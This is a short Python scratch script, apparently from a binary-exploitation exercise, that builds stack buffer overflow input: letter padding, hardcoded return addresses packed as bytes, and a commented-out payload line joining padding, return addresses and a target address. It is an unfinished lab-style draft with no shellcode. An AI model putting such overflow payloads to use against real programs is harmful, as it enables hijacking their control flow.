import struct
RET= "\xe7\x51\x55\x55\x55\x55"#0x5555555551e7
RET2=struct.pack("Q",0x7fffffffde80)# "\xe7\x51\x55\x55\x55\x55"#0x5555555551e7

#WHAT="0x7fffffffdea0"
WHAT="\xa0\xde\xff\xff\xff\x7f"
WHAT2="\x7f\xff\xff\xff\xde\xa0"
pad=(("A"*2)+("B"*2)+("C"*2)+("D"*2)+("E"*2)+("F"*2)+("G"*2)+("H"*2))#+("I"*2)+("J"*2)+("K"*2)+("L"*2))#+("M"*2)+("N"*2)+("O"*2)+("P"*2)+("Q"*2))
#print pad+RET+RET+WHAT2+"\x00\x00"

print ("A"*4)
print ("B"*4)
print ("C"*4)
print ("D"*4)
print ("E"*4)
print ("F"*4)

#print ("B"*64)
#print ("C"*64)
#print ("D"*64)
#print("0x7fffffffde80"*4)
#print0x7fffffffde80
#print("\x80\xde\xff\xff\xff\x7f"*4)
print(RET2)




